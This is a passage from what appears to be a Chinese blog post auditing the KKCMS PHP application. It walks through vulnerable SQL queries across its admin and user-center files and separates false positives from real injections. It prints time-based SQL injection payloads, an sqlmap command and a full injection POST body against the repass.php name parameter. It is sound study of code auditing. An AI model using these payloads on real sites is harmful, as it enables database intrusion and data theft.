operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cid'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">') order by d_id desc'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这个<code>cid</code>参数是被括号包裹的，这里我们可以尝试通过使用这种payload来进行闭合语句从而进行SQL注入</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">cid<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token comment\">//此时语句$sql = 'select * from xtcms_vod where d_parent in (1) and sleep(5)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151754.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151909.png\" alt=\"在这里插入图片描述\"><br>根据回显时间可以看出此处是存在SQL注入的</p>\n<h3 id=\"admin-cms-kamilist-php-1\"><a href=\"#admin-cms-kamilist-php-1\" class=\"headerlink\" title=\"admin/cms_kamilist.php\"></a>admin/cms_kamilist.php</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../system/inc.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cms_check.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span>\nif (isset($_GET['c_used'])) &#123;\n\t$sql = 'select * from xtcms_user_card where c_used=\"'.$_GET['c_used'].'\" order by c_id desc';\n\t$pager = page_handle('page',20,mysql_num_rows(mysql_query($sql)));\n\t$result = mysql_query($sql.' limit '.$pager[0].','.$pager[1].'');\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话可以看出参数被双引号包裹了，开头包含了SQL防护文件，涉及了<code>addslashes()</code>函数，所以这里自认为是不存在SQL注入的，找下一处。</p>\n<h3 id=\"ucenter-index-php\"><a href=\"#ucenter-index-php\" class=\"headerlink\" title=\"ucenter/index.php\"></a>ucenter/index.php</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">//部分\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../system/inc.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">alert_href</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'请登陆后进入'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'login.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'left.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_user where u_name=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话可以看见参数是<code>SESSION</code>传参，不同于之前的GET和POST，而且这里还有双引号包裹，因此这里不存在SQL注入，下一处<br>类似这种的还有</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">ucenter<span class=\"token operator\">/</span>kami<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_user where u_name=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nucenter<span class=\"token operator\">/</span>chongzhi<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_user where u_name=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nucenter<span class=\"token operator\">/</span>mingxi<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_user where u_name=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"ucenter-cms-user-add-php\"><a href=\"#ucenter-cms-user-add-php\" class=\"headerlink\" title=\"ucenter/cms_user_add.php\"></a>ucenter/cms_user_add.php</h3><p>源码为</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../system/inc.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cms_check.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'save'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n<span class=\"token function\">null_back</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'请填写登录帐号'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">null_back</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'请填写登录密码'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_user where u_name = \"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_name'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">alert_back</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'帐号重复，请输入新的帐号。'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>双引号包裹，且包含了过滤函数，因此SQL注入不存在，误报，类似这种的还有</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">ucenter<span class=\"token operator\">/</span>return_url<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$order</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_user_pay where p_order=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$out_trade_no</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nucenter<span class=\"token operator\">/</span>password<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'select * from xtcms_user where u_name = \"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$u_name</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" and u_password = \"'</span><span class=\"token operator\">.</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u_password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" and u_status=1'</span><span class=\"token punctuation\">;</span>\n\nucenter<span class=\"token operator\">/</span>reg<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_user where u_email = \"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'email'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nucenter<span class=\"token operator\">/</span>login<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'select * from xtcms_user where u_name = \"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$u_name</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" and u_password = \"'</span><span class=\"token operator\">.</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u_password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" and u_status=1'</span><span class=\"token punctuation\">;</span>\n\nucenter<span class=\"token operator\">/</span>mingxi<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$card</span><span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_userka where id=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cardid'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"ucenter-repass-php\"><a href=\"#ucenter-repass-php\" class=\"headerlink\" title=\"ucenter/repass.php\"></a>ucenter/repass.php</h3><p>源码为</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../system/inc.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'location:index.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\t\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$email</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'email'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 检测用户名是否存在</span>\n<span class=\"token variable\">$query</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select u_id from xtcms_user where u_name='<span class=\"token interpolation\"><span class=\"token variable\">$username</span></span>' and u_email='<span class=\"token interpolation\"><span class=\"token variable\">$email</span></span>'\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span> <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$_data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_password'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token number\">123456</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'update xtcms_user set '</span><span class=\"token operator\">.</span><span class=\"token function\">arrtoupdate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' where u_name=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$username</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话我们看到参数name</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这里引用了<code>stripslashes</code>函数，而文件开头又包含<code>inc.php</code>，这个文件里包含了<code>addslashes</code>函数，当我们参数出现单引号这种特殊字符时，<code>addslashes</code>会加上反引号，而<code>stripslashes</code>会清除<code>addslashes</code>函数加上的反引号，这个时候就相当于没有防护一样，所以显而易见这里是存在SQL注入的，我们可以使用bp抓包保存后，再利用sqlmap来得到数据库信息，具体payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">python sqlmap<span class=\"token operator\">.</span>py <span class=\"token operator\">-</span>r <span class=\"token string double-quoted-string\">\"D:\\sqlmap\\3.txt\"</span> <span class=\"token operator\">-</span>p name <span class=\"token operator\">--</span>dbs<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>但很怪，我自己的没有跑出来数据<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151002.png\" alt=\"在这里插入图片描述\"><br>而我参考其他师傅的文章后发现他们的可以跑出来。<br>payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">name<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string single-quoted-string\">' AND (SELECT 3775 FROM (SELECT(SLEEP(5)))OXGU) AND '</span>XUOn<span class=\"token string single-quoted-string\">'='</span>XUOn<span class=\"token operator\">&amp;</span>email<span class=\"token operator\">=</span><span class=\"token number\">1</span>@qq<span class=\"token operator\">.</span>com<span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span><span class=\"token number\">111</span><span class=\"token operator\">&amp;</span>submit<span class=\"token operator\">=</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151084.png\" alt=\"在这里插入图片描述\"><br>类似这种的还有</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">ucenter<span class=\"token operator\">/</span>active<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$verify</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'verify'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$nowtime</span> <span class=\"token operator\">=</span> <span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$query</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select u_id from xtcms_user where u_question='<span class=\"token interpolation\"><span class=\"token variable\">$verify</span></span>'\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nucenter<span class=\"token operator\">/</span>reg<span class=\"token operator\">.</span>php\n其内<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$query</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select u_id from xtcms_user where u_name='<span class=\"token interpolation\"><span class=\"token variable\">$username</span></span>'\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>本次CMS审计花费了很多时间,一方面因为漏洞点有点多，另一方面也是初学代码审计，不太擅长，经过此次审计后对SQL注入和XSS漏洞有了进一步的了解，也学到了新的思路和知识。也希望此文章能对在学习代码审计的师傅有一些帮助。</p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://xz.aliyun.com/t/7711\">https://xz.aliyun.com/t/7711</a><br><a href=\"https://xz.aliyun.com/t/11322#toc-2\">https://xz.aliyun.com/t/11322#toc-2</a></p>\n","feature":true,"text":"声明文章首发于先知社区https://xz.aliyun.com/t/11714 前言本次审计的话是Seay+昆仑镜进行漏洞扫描Seay的话它可以很方便的查看各个文件，而昆仑镜可以很快且扫出更多的漏洞点，将这两者进行结合起来，就可以发挥更好的效果。昆仑镜官方地址https://g...","link":"","photos":[],"count_time":{"symbolsCount":"32k","symbolsTime":"29 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"代码审计","slug":"代码审计","count":6,"path":"api/tags/代码审计.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A3%B0%E6%98%8E\"><span class=\"toc-text\">声明</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83\"><span class=\"toc-text\">环境</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#KKCMS%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\"><span class=\"toc-text\">KKCMS环境搭建</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84\"><span class=\"toc-text\">目录结构</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\"><span class=\"toc-text\">代码审计</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%AA%8C%E8%AF%81%E7%A0%81%E9%87%8D%E7%94%A8\"><span class=\"toc-text\">验证码重用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#admin-cms-login-php\"><span class=\"toc-text\">admin&#x2F;cms_login.php</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XSS\"><span class=\"toc-text\">XSS</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#wap-shang-php\"><span class=\"toc-text\">wap&#x2F;shang.php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#wap-seacher-php\"><span class=\"toc-text\">wap&#x2F;seacher.php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#wap-movie-php\"><span class=\"toc-text\">wap&#x2F;movie.php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#system-pcon-php-%E5%A4%B1%E8%B4%A5\"><span class=\"toc-text\">system&#x2F;pcon.php(失败)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#admin-cms-ad-php\"><span class=\"toc-text\">admin&#x2F;cms_ad.php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#youlian-php\"><span class=\"toc-text\">youlian.php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#admin-cms-kamilist-php\"><span class=\"toc-text\">admin&#x2F;cms_kamilist.php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#wx-api-php\"><span class=\"toc-text\">wx_api.php</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SQL\"><span class=\"toc-text\">SQL</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#bplay-php\"><span class=\"toc-text\">bplay.php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#wap-user-php%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89\"><span class=\"toc-text\">wap&#x2F;user.php（失败）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#wap-login-php\"><span class=\"toc-text\">wap&#x2F;login.php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#vlist-php\"><span class=\"toc-text\">vlist.php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%90%8E%E7%AB%AF%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">后端文件</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#admin-cms-admin-edit-php\"><span class=\"toc-text\">admin&#x2F;cms_admin_edit.php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#admin-cms-login-php-1\"><span class=\"toc-text\">admin&#x2F;cms_login.php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#admin-cms-user-edit-php\"><span class=\"toc-text\">admin&#x2F;cms_user_edit.php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#admin-cms-user-php\"><span 